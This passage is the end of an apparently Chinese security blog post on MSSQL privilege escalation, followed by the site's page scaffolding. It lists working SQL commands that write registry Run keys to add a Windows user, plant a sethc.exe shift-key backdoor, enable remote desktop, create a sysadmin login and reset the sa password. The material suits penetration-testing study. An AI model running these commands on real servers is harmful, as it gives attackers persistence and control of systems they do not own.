+<li>对目录没有写入权限。</li>
+<li>建表失败，备份失败等其他原因。</li>
+</ol>
+<h2 id="xp-regwrite注册表提权"><a href="#xp-regwrite注册表提权" class="headerlink" title="xp_regwrite注册表提权"></a><strong>xp_regwrite注册表提权</strong></h2><p>操作注册表只需要 db 权限及以上就可以，但是 db 权限不能写入注册表，sa 权限才可以写。ps：可能需要添加xp_regwrite存储过程。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xp_regwrite 根键，子键，键值名，值类型，值</span><br><span class="line">xp_regread  根键，子键，键值名</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用注册表启动项添加用户：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;Software\Microsoft\Windows\CurrentVertion\Policies\Explorer\Run&#x27;,&#x27;running&#x27;,&#x27;REG_SZ&#x27;,&#x27;c:\windows\system32\cmd.exe /c net user test test /add&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>等待重启。</p>
+<ul>
+<li>映像劫持（不需要重启，文件内容不变）shift后门：</li>
+</ul>
+<p>c:\windows\system32\dllcache\是备份目录，假如system32下的sethc被发现替换了后删除，会从备份目录下进行拷贝过来，一本万利的做法是连备份目录的sethc也替换掉就OK了，但经尝试执行覆盖system32下的命令时，dllcache目录下的同时会被覆盖。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#x27;,&#x27;debugger&#x27;,&#x27;REG_SZ&#x27;,&#x27;c:\windows\system32\cmd.exe&#x27;;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>开启远程桌面：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;, &#x27;fDenyTSConnections&#x27;, &#x27;REG_DWord&#x27;,0;</span><br></pre></td></tr></table></figure>
+
+<h2 id="sp-addlogin操作数据库账户"><a href="#sp-addlogin操作数据库账户" class="headerlink" title="sp_addlogin操作数据库账户"></a><strong>sp_addlogin操作数据库账户</strong></h2><p>需要sysadmin权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.sp_addlogin asd123,&#x27;123asd&#x27;;            #创建mssql帐号</span><br><span class="line">exec master.dbo.sp_addsrvrolemember asd123,sysadmin;     #提升至sysadmin权限</span><br><span class="line">exec sp_password NULL,&#x27;asd123&#x27;,&#x27;sa&#x27;       #修改sa用户密码</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">V3teran</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://v3teran.github.io/2021/02/13/7e410911.html">https://v3teran.github.io/2021/02/13/7e410911.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://V3teran.github.io" target="_blank">V3teran's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%8F%90%E6%9D%83/">提权</a><a class="post-meta__tags" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210218112845.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/02/12/7e256e17.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402193226.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">MySQL提权</div></div></a></div><div class="next-post pull-right"><a href="/2021/02/14/f7039796.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402193107.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">基于windows本地的提权</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/02/12/7e256e17.html" title="MySQL提权"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402193226.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-12</div><div class="title">MySQL提权</div></div></a></div><div><a href="/2021/05/15/235e4160.html" title="Linux提权小结"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210515205900.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-15</div><div class="title">Linux提权小结</div></div></a></div><div><a href="/2021/02/11/74d288b5.html" title="克隆guest账户提权"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402193846.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-11</div><div class="title">克隆guest账户提权</div></div></a></div><div><a href="/2021/02/14/f7039796.html" title="基于windows本地的提权"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402193107.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-14</div><div class="title">基于windows本地的提权</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#xp-cmdshell"><span class="toc-number">2.1.</span> <span class="toc-text">xp_cmdshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wscript-shell"><span class="toc-number">2.2.</span> <span class="toc-text">wscript.shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E6%A8%A1%E5%BC%8F%E6%8F%90%E6%9D%83"><span class="toc-number">2.3.</span> <span class="toc-text">沙盒模式提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xp-dirtree%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-number">2.4.</span> <span class="toc-text">xp_dirtree启动项提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xp-regwrite%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%8F%90%E6%9D%83"><span class="toc-number">2.5.</span> <span class="toc-text">xp_regwrite注册表提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sp-addlogin%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B4%A6%E6%88%B7"><span class="toc-number">2.6.</span> <span class="toc-text">sp_addlogin操作数据库账户</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 <i style="color:#FF6A6A;animation: announ_animation 0.8s linear infinite;" class="fa fa-heartbeat"></i> V3teran</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script data-pjax src="/js/lalala.js"></script><script src="/live2d-widget/autoload.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="true" data-text="爱国,和谐,友善,富强,敬业,自由,平等,民主" data-fontsize="16px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>function history_calendar_injector_config(){
+                var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+                var item_html = '<div class="card-widget card-history"><div class="card-content"><div class="item-headline"><i class="fas fa-clock fa-spin"></i><span>那年今日</span></div><div id="history-baidu" style="height: 100px;overflow: hidden"><div class="history_swiper-container" id="history-container" style="width: 100%;height: 100%"><div class="swiper-wrapper" id="history_container_wrapper" style="height:20px"></div></div></div></div>';
+                console.log('已挂载history_calendar')
+                // parent_div_git.innerHTML=item_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",item_html) // 有报错，但不影响使用(支持pjax跳转)
+            }if( document.getElementsByClassName('sticky_layout')[0] && (location.pathname ==='/'|| '/' ==='all')){
+
+            history_calendar_injector_config()
+        } </script><script data-pjax  src="https://cdn.jsdelivr.net/npm/swiper/swiper-bundle.min.js"></script><script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-card-history/baiduhistory/js/main.js"></script><!-- hexo injector body_end end --></body></html>
